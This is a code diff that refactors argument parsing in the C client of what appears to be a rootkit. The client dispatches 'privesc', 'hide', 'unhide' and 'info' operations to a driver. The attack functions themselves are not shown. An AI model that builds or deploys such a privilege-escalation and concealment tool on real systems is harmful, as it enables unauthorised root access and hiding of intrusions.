@@ -51,48 +51,46 @@ int main(int argc, char *argv[])
 
     int ret = 0;
 
-    for (int i = 0; i < argc; i++)
+    char *operation = argv[1];
+
+    CLIENT_DEBUG("[+] Operation : %s\n", operation);
+
+    if (strcmp(operation, "privesc") == 0)
     {
+        CLIENT_DEBUG("[+] Running the privesc\n");
+        ret = privesc(driver);
+    }
 
-        CLIENT_DEBUG("Argument %d: %s\n", i, argv[i]);
+    else if (strcmp(operation, "info") == 0)
+    {
+        CLIENT_DEBUG("[+] Running the show_info\n");
+        show_info();
+    }
 
-        if (
-            (strcmp(argv[i], "--privesc") == 0) || 
-            (strcmp(argv[i], "-p") == 0)
-        ) {
-            CLIENT_DEBUG("[+] Running the privesc\n");
-            ret = privesc(driver);
-        }
-        else if (
-            (strcmp(argv[i], "--info") == 0) || 
-            (strcmp(argv[i], "-i") == 0)
-        ) {
-            CLIENT_DEBUG("[+] Running the show_info\n");
-            show_info();
-        }
-        else if (strcmp(argv[i], "--unhide") == 0)
-        {
-            CLIENT_DEBUG("[+] Running the unhide\n");
-            ret = unhide(driver);
-        }
+    else if (strcmp(operation, "unhide") == 0)
+    {
+        CLIENT_DEBUG("[+] Running the unhide\n");
+        ret = unhide(driver);
+    }
 
-        else if (strcmp(argv[i], "--hide") == 0)
-        {
-            CLIENT_DEBUG("[+] Running the hide\n");
-            ret = hide(driver);
-        }
-        else if (
-            (strcmp(argv[i], "-h") == 0) || 
-            (strcmp(argv[i], "--help") == 0)
-        ) {
-            CLIENT_DEBUG("[+] Running the display_help\n");
-            display_help(driver);
-        }
-        else if (i > 0)
-        {
-            printf("Unknown argument : %s\n", argv[i]);
-            display_help(driver);
-        }
+    else if (strcmp(operation, "hide") == 0)
+    {
+        CLIENT_DEBUG("[+] Running the hide\n");
+        ret = hide(driver);
+    }
+
+    else if (
+        (strcmp(operation, "-h") == 0) || 
+        (strcmp(operation, "help") == 0)
+    ) {
+        CLIENT_DEBUG("[+] Running the display_help\n");
+        display_help(driver);
+    }
+
+    else
+    {
+        printf("Unknown argument : %s\n", operation);
+        display_help(driver);
     }
 
     free(driver);
